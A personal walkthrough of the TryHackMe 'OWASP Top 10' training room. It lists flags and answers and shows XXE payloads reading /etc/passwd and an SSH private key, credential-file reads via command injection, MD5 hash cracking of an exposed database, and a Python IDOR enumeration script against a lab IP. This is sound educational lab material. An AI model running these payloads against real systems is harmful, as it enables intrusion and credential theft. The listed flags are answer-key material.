TryHackMe | OWASP Top 10

 > Caleb C | 2022-2-17

------------

(OWASP 10)[https://tryhackme.com/room/owasptop10]

Tips on boxes
Commands to try

Linux
```bash
whoami
id
ifconfig/ip addr
uname -a
ps -ef
```
Windows
```cmd
whoami
ver
ipconfig
tasklist
netstat -an
```
## Severity 1 - Command Injection Practical

1. What strange text file is in the website root directory?
 > ls
 > drpepper.txt

2. How many non-root/non-service/non-daemon users are there?
 > cat /etc/passwd
 > 0

3. What user is this app running as?
 > whoami
 > www-data

4. What is the user's shell set as?
 > cat /etc/passwd
 > /usr/sbin/nologin

5. What version of Ubuntu is running?
 > lsb_release -a
 > 18.04.4

6. Print out the MOTD.  What favorite beverage is shown?
 > cat /etc/update-motd.d/00-header
 > Dr Pepper

## Severity 2 - Broken Authentication Practical 

1. What is the flag that you found in darren's account?
 > fe86079416a21a3c99937fea8874b667

2. What is the flag that you found in arthur's account?
 > d9ac0f7db4fda460ac3edeb75d75e16e

## Severity 3 - Sensitive Data Exposure (intro)


Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. 

1. What is the name of the mentioned directory?
 > /assets
This was found by looking in the chrome dev tools to find a HTML comment of where the directory was located.

2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
 > webapp.db
Located at IP/assets

3. Use the supporting material to access the sensitive data. What is the password hash of the admin user?
 > 6eea9b7ef19179a06954edd0f6c05ceb
After downloading the webapp.db, query the file with `file webapp.db` to find it is a SQlite3 Database file.
`sqlite > .tables
sqlite > PRAGMA table_info(users);
sqlite > SELECT * from users`

4. What is the admin's plaintext password?
 > qwertyuiop
Use `cracksation` website to enter weak MD5 hashed password from `webapp.db`

5. Login as the admin. What is the flag?
 > THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Severity 4 - XML External Entity

Every XML document mostly starts with what is known as XML Prolog.
`<?xml version="1.0" encoding="UTF-8"?>`

Every XML document must contain a `ROOT` element. For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```


In the above example the `<mail>` is the ROOT element of that document and `<to>, <from>, <subject>, <text>` are the children elements. If the XML document doesn't have any root element then it would be considered wrong or invalid XML doc.

Before we move on to start learning about XXE we'll have to understand what is DTD in XML.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named `note.dtd` with the following content:

`<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>`

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses note.dtd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```
 >!DOCTYPE note -  Defines a root element of the document named note
 >!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
 >!ELEMENT to - Defines the to element to be of type "#PCDATA"
 >!ELEMENT from - Defines the from element to be of type "#PCDATA"
 >!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
 >!ELEMENT body - Defines the body element to be of type "#PCDATA"

The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
 ```

We can also use XXE to `read` some file from the system by defining an ENTITY and having it use the `SYSTEM` keyword

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Personal try at reading Falcons home directory
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'ls:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

## Severity 5 - Broken Access Control

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.

```python
#!/usr/bin/env python3

import requests

number = range(100)

for num in number:
    ip = "http://10.10.206.79/note.php?note="
    ip = ip + str(num)
    r = requests.get(ip)
    print(ip)
    print(r.text)
```